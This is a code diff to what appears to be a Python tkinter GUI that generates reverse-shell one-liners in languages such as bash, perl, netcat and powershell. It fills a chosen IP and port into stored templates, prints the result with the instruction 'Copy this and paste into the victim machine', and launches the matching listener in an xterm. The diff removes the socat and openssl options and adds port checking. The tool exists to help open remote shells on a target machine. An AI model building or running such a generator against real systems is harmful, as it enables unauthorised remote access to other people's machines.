@@ -3,7 +3,9 @@ from tkinter import ttk
 from tkinter import messagebox
 from PIL import ImageTk, Image
 from subprocess import check_output
+import subprocess
 import re
+import sys
 import os,time
 
 class TextRedirector(object):
@@ -76,7 +78,7 @@ class BaseFrame(Frame):
     	self.reversebutton.grid(row = 0, column = 0)
     	
     	self.languagechosen = ttk.Combobox(self.languageentrybg, font="Raleway 24", width = 11)
-    	self.languagechosen['values'] = ("Bash","Socat","Perl","Python","PHP","Ruby","Golang","Netcat","Ncat","OpenSSL","Powershell","TCLsh","Gawk","Telnet")
+    	self.languagechosen['values'] = ("Bash","Perl","Python","PHP","Ruby","Golang","Netcat","Ncat","Powershell","TCLsh","Gawk","Telnet")
     	self.languagechosen.grid(row = 0, column = 0)		
     	self.languagechosen.current()
 
@@ -84,7 +86,7 @@ class BaseFrame(Frame):
     	self.ipchosen['values'] = self.get_ip()
     	self.ipchosen.grid(row = 0, column = 0)		
     	self.ipchosen.current()
-    	
+
     	self.backbuttonbg = Frame(self.footer, bg="#12263A", borderwidth = 0, relief = SUNKEN, pady="0", padx = "10")
     	self.backbuttonbg.grid(row = 0, column = 0, sticky = N+W)
     	
@@ -103,6 +105,9 @@ class BaseFrame(Frame):
     	sys.stderr = TextRedirector(self.reverseoutput, "stderr")
     	
     	self.pack()
+
+    #def run_listener(self,command):
+    #    
 
     def get_ip(self):
         list_ips = []
@@ -127,7 +132,7 @@ class BaseFrame(Frame):
                 elif i == '£':
                     line = line.replace("£",str(port))
 
-            langArr = [["bash-","bash1-","bashu-"],["socat-"],["perl-","perl1-","perl2-"],["python-","python1-","python2-"],["php-","php1-","php2-","php3-","php4-","php5-"],["ruby-","ruby1-"],["golang-"],["netcatbsd-","netcattrad-","netcattrad1-"],["ncat-"],["openssl-","openssl1-"],["powershell-","powershell1-"],["tclsh-"],["gawk-"],["telnet-","telnet1-"]]
+            langArr = [["bash-","bash1-"],["perl-","perl1-","perl2-"],["python-","python1-","python2-"],["php-","php1-","php2-","php3-","php4-","php5-"],["ruby-","ruby1-"],["golang-"],["netcatbsd-","netcattrad-","netcattrad1-"],["ncat-"],["powershell-","powershell1-"],["tclsh-"],["gawk-"],["telnet-","telnet1-"]]
 
             numofoutputs = len(langArr[language])
             
@@ -138,32 +143,43 @@ class BaseFrame(Frame):
         for x in range(0, codeno):
             shellcode = x
             linecount = 0 #set linecount to 0
+            
             for line in lines: #for each line in file
                 linecount += 1 #increment linecount to signify which line we are on
                 if langArr[language][shellcode] in line:
                     line = line.replace("@",ip) #replace ip and port again for that specific code chosen
                     line = line.replace("£",str(port))
-                    print("Copy this and paste into the victim machine:\n" + line.replace(langArr[language][shellcode],"")) #output code to copy
+                    line = line.replace(langArr[language][shellcode],"")
+                    print("Copy this and paste into the victim machine:\n" + line) #output code to copy
                     lines[linecount] = lines[linecount].replace("@",ip)
                     lines[linecount] = lines[linecount].replace("£",str(port))
                     break #break da loop so we can end
             file1.close() #close files
-        os.system(str(lines[linecount])) #run the listener for the code selected
-        messagebox.showinfo(title="SUCCESS!!!", message="Exploit is Now Being Conducted!")
+        return str(lines[linecount])
         
-        
+
+
     def attack_btn_pressed(self):
         language = self.languagechosen.get()
         ip = self.ipchosen.get()
         port = self.Portentry.get()
-        languages = ["bash","socat","perl","python","php","ruby","golang","netcat","ncat","openssl","powershell","tclsh","gawk","telnet"]
+        languages = ["bash","perl","python","php","ruby","golang","netcat","ncat","powershell","tclsh","gawk","telnet"]
         if language.lower() in languages:
             languageid = languages.index(language.lower())
             if ip in self.get_ip():
-                if int(port) in range(65536):
-                    self.OutputCommands(ip, port, languageid)
-                else:
+                try:
+                    port = int(port)
+                except:
                     messagebox.showerror(title="ERROR!!!", message="The Port " + str(port) + " is not Valid!")
+                else:
+                    if int(port) in range(1,65536):
+                        messagebox.showinfo(title="SUCCESS!!!", message="Exploit is Now Being Conducted!")
+                        command = self.OutputCommands(ip, port, languageid)
+                        command2 = "xterm -hold -e " +  command
+                        os.system(command2)
+
+                    else:
+                        messagebox.showerror(title="ERROR!!!", message="The Port " + str(port) + " is not Valid!")
             else:
                 messagebox.showerror(title="ERROR!!!", message="The IP Address " + str(ip) + " is not Valid!")
         else:
